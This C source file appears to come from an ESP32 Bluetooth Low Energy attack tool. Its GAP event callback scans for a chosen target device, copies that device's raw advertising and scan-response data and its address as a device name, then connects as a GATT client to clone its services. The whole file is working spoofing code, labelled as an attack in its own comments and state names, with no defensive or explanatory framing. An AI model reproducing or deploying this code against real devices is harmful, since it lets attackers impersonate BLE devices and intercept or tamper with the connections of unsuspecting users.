#include "gatt_internal.h"

/**
 * esp_gap_cb
 *
 * Callback for the GAP.
 * This handles scanning
 * for advertisements and
 * spoofing them once found.
 * A GATT Client is then
 * started to connect to the
 * target device to clone the
 * services.
 *
 * @param esp_gap_ble_cb_event_t event
 * @param esp_ble_gap_cb_param_t *param
 */
void esp_gap_cb(esp_gap_ble_cb_event_t event, esp_ble_gap_cb_param_t *param) {
  if (shutdown_gatt_attack) return;
  uint8_t *adv_name = NULL;
  uint8_t adv_name_len = 0;
  switch (event) {
    case ESP_GAP_BLE_SCAN_PARAM_SET_COMPLETE_EVT: {
      esp_ble_gap_start_scanning(30);
      break;
    }
    case ESP_GAP_BLE_SCAN_START_COMPLETE_EVT: {
      if (param->scan_start_cmpl.status != ESP_BT_STATUS_SUCCESS) {
        ESP_LOGE(TAG, "scan start failed, error status = %x", param->scan_start_cmpl.status);
        break;
      }
      gatt_send_output("Scan started", false);
      break;
    }
    case ESP_GAP_BLE_SCAN_RESULT_EVT: {
      switch (param->scan_rst.search_evt) {
        case ESP_GAP_SEARCH_INQ_RES_EVT: {
          if (connecting || connected) {
            break;
          }
          adv_name = esp_ble_resolve_adv_data(param->scan_rst.ble_adv,
                                              ESP_BLE_AD_TYPE_NAME_CMPL,
                                              &adv_name_len);
          if (memcmp(clone.target, param->scan_rst.bda, sizeof(esp_bd_addr_t)) == 0) {

            memcpy(clone.target_bda, param->scan_rst.bda, sizeof(esp_bd_addr_t));
            ESP_LOGI(TAG, "Device: ");
            esp_log_buffer_char(TAG, adv_name, adv_name_len);
            esp_log_buffer_hex(TAG, param->scan_rst.bda, 6);
            ESP_LOGI(TAG, "Name len: %d, adv len: %d, scan response len: %d",
                     adv_name_len, param->scan_rst.adv_data_len,
                     param->scan_rst.scan_rsp_len);

            if (param->scan_rst.adv_data_len > 0) {
              ESP_LOGI(TAG, "adv data:");
              esp_log_buffer_hex(TAG, &param->scan_rst.ble_adv[0], param->scan_rst.adv_data_len);
            }

            if (param->scan_rst.scan_rsp_len > 0) {
              ESP_LOGI(TAG, "scan resp:");
              esp_log_buffer_hex(TAG,
                                 &param->scan_rst.ble_adv[param->scan_rst.adv_data_len],
                                 param->scan_rst.scan_rsp_len);
            }

            if (!connected || !connecting) {
              connecting = true;
              esp_ble_gap_stop_scanning();

              char device_name[20];
              snprintf(device_name, sizeof(device_name),
                       "%02X:%02X:%02X:%02X:%02X:%02X", clone.target[0], clone.target[1],
                       clone.target[2], clone.target[3], clone.target[4], clone.target[5]);
              esp_err_t set_dev_name_ret = esp_ble_gap_set_device_name(device_name);
              if (set_dev_name_ret){
                ESP_LOGE(TAG, "set device name failed, error code = %x", set_dev_name_ret);
              }

              esp_err_t raw_adv_ret = esp_ble_gap_config_adv_data_raw(
                  param->scan_rst.ble_adv, param->scan_rst.adv_data_len);
              if (raw_adv_ret){
                ESP_LOGE(TAG, "config raw adv data failed, error code = %x ", raw_adv_ret);
              }

              if (param->scan_rst.scan_rsp_len > 0) {
                uint8_t *raw_scan_rsp_data = &param->scan_rst.ble_adv[param->scan_rst.adv_data_len];
                esp_err_t raw_scan_ret = esp_ble_gap_config_scan_rsp_data_raw(
                    raw_scan_rsp_data, param->scan_rst.scan_rsp_len);
                if (raw_scan_ret){
                  ESP_LOGE(TAG, "config raw scan rsp data failed, error code = %x", raw_scan_ret);
                }
              }


              gatt_send_output("Connecting to target", false);
              gattAttackState = GATT_ATTACK_STATE_CLIENT_CONNECTING;
              gatt_send_state((int)gattAttackState);
              if (esp_ble_gattc_open(clone.gattc_if, param->scan_rst.bda,
                  param->scan_rst.ble_addr_type, true) != ESP_OK)
                connection_failed("open submission");
            }
          }
          break;
        }
        case ESP_GAP_SEARCH_INQ_CMPL_EVT: {
          if (!clone_init) {
            shutdown_gatt_attack = true;
            gatt_send_output("Target connection failed", false);
            gattAttackState = GATT_ATTACK_STATE_CLIENT_CONNECT_FAIL;
            gatt_send_state((int)gattAttackState);
          }
          break;
        }
        default:
          break;
      }

      break;
    }
    case ESP_GAP_BLE_SCAN_STOP_COMPLETE_EVT: {
      if (param->scan_stop_cmpl.status != ESP_BT_STATUS_SUCCESS) {
        ESP_LOGE(TAG, "scan stop failed, error status = %x", param->scan_stop_cmpl.status);

        break;
      }
      ESP_LOGI(TAG, "stop scan successfully");
      break;
    }
    case ESP_GAP_BLE_ADV_START_COMPLETE_EVT: {
      //advertising start complete event to indicate advertising start successfully or failed
      if (param->adv_start_cmpl.status != ESP_BT_STATUS_SUCCESS) {
        ESP_LOGE(TAG, "Advertising start failed");
      } else {
        gatt_send_output("Target clone advertising", false);
      }

      break;
    }
    case ESP_GAP_BLE_ADV_STOP_COMPLETE_EVT: {
      if (param->adv_stop_cmpl.status != ESP_BT_STATUS_SUCCESS) {
        ESP_LOGE(TAG, "adv stop failed, error status = %x", param->adv_stop_cmpl.status);
        break;
      }
      break;
    }
    case ESP_GAP_BLE_SCAN_TIMEOUT_EVT: {
      if (!clone_init) {
        gattAttackState = GATT_ATTACK_STATE_FAILED;
        gatt_send_state((int)gattAttackState);
      }
      break;
    }
    default:
      break;
  }
};
